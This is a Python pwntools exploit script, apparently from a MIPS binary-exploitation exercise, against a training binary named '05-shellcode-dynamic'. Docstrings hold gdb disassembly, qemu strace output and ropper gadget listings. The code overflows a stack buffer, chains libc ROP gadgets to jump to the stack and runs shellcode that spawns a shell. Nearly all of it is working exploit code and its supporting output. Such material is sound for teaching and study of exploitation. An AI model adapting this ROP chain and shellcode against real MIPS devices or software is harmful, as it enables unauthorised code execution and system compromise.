#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x004007c0 <+0>:	addiu	sp,sp,-160
   0x004007c4 <+4>:	sw	ra,156(sp)
...
   0x0040085c <+156>:	lw	ra,156(sp)
   0x00400860 <+160>:	lw	s8,152(sp)
   0x00400864 <+164>:	addiu	sp,sp,160
   0x00400868 <+168>:	jr	ra
   0x0040086c <+172>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x4007dc: file src/05-shellcode-dynamic.c, line 6.
(gdb) b *0x0040085c
Breakpoint 2 at 0x40085c: file src/05-shellcode-dynamic.c, line 13.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/05-shellcode-dynamic.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x7fffef28 "\177~\272X\177~\243\f\177|\210D"
(gdb) c
Continuing.

Breakpoint 2, 0x0040085c in vulnerable () at src/05-shellcode-dynamic.c:13
13	}
(gdb) p/x $sp+156
$2 = 0x7fffefac
"""

"""
$ qemu-mips -L /usr/mips-linux-gnu/ -strace ./bin/mips/05-shellcode-dynamic 
...
23704 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
23704 mmap2(NULL,1638448,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x7f615000
...
"""

"""
$ ropper --nocolor --file /usr/mips-linux-gnu/lib/libc-2.27.so
0x0001b1e8: lw $ra, 0x24($sp); lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
0x0002d518: move $s5, $s2; move $t9, $s1; jalr $t9; move $a0, $s7;
0x000f0d3c: move $t9, $s5; jalr $t9; addiu $s6, $sp, 0x50;
0x000639e8: move $t9, $s6; jalr $t9; nop; 
"""

import struct
import sys

from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

binary_path = './bin/mips/05-shellcode-dynamic'

ra_saved_addr = 0x7fffefac
buffer_addr = 0x7fffef28
libc_addr = 0x7f615000

lw_s1_s2_addr = libc_addr + 0x0001b1e8
move_s5_s2_jump_s1_addr = libc_addr + 0x0002d518
addiu_s6_sp_0x50_jump_s5_addr = libc_addr + 0x000f0d3c
jump_s6_addr = libc_addr + 0x000639e8

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p32(lw_s1_s2_addr)
payload += 'b' * 0x18
payload += p32(0) # s0
payload += p32(addiu_s6_sp_0x50_jump_s5_addr) # s1
payload += p32(jump_s6_addr) # s2
payload += p32(move_s5_s2_jump_s1_addr) # ra
payload += 'c' * 0x50
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
